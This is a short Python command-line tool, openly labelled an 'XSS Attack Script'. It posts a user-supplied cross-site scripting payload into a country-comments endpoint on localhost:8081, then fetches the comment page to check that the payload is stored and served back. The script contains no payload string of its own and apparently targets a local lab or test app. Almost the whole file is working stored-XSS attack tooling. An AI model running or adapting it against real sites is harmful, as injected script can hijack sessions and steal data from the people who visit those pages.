#!/usr/bin/env python3

import requests
import argparse
import sys

BASE_URL = "http://localhost:8081"

def inject_payload(country_name, payload):
    """Inject XSS payload into the comments system."""
    url = f"{BASE_URL}/comments/add"
    params = {
        "countryName": country_name,
        "content": payload
    }
    
    try:
        response = requests.post(url, params=params)
        response.raise_for_status()
        print(f"[+] Successfully injected payload for country: {country_name}")
        print(f"[+] Response: {response.text}")
    except requests.exceptions.RequestException as e:
        print(f"[-] Error injecting payload: {e}")
        sys.exit(1)

def retrieve_payload(country_name):
    """Retrieve and display comments for a country."""
    url = f"{BASE_URL}/comments/view/{country_name}"
    
    try:
        response = requests.get(url)
        response.raise_for_status()
        print(f"[+] Retrieved comments for country: {country_name}")
        print("\n=== Response Content ===")
        print(response.text)
        print("======================")
    except requests.exceptions.RequestException as e:
        print(f"[-] Error retrieving comments: {e}")
        sys.exit(1)

def main():
    parser = argparse.ArgumentParser(description="XSS Attack Script for Country Comments")
    parser.add_argument("--mode", choices=["inject", "retrieve"], required=True,
                      help="Mode of operation: inject or retrieve")
    parser.add_argument("--country", required=True,
                      help="Target country name")
    parser.add_argument("--payload", 
                      help="XSS payload to inject (required for inject mode)")
    
    args = parser.parse_args()
    
    if args.mode == "inject":
        if not args.payload:
            print("[-] Payload is required for inject mode")
            sys.exit(1)
        inject_payload(args.country, args.payload)
    else:
        retrieve_payload(args.country)

if __name__ == "__main__":
    main() 